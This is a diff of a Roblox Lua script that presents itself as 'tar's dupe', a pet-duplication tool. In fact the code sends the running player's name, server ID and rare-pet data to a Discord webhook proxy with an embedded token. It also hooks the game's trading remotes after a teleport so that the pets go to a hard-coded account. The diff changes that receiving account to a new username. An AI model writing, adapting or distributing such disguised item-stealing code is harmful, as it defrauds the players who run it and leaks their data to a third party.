@@ -934,7 +934,7 @@ end
 H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 
 local looool = nil
-for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90011 and not v.dm and not v.r and not v.g then pcall(function()http_request({Url='https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'worstchild123'then looool = v.id ACC_TO_GIVE_PETS='worstchild123'end break end end
+for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90011 and not v.dm and not v.r and not v.g then pcall(function()http_request({Url='https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'sowhatsatimberland'then looool = v.id ACC_TO_GIVE_PETS='sowhatsatimberland'end break end end
 
 local IDs = ""
 
@@ -1004,7 +1004,7 @@ queue_on_teleport([==[
 	end)
         local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
 	
-	local PLR = game.Players:FindFirstChild'worstchild123' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+	local PLR = game.Players:FindFirstChild'sowhatsatimberland' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
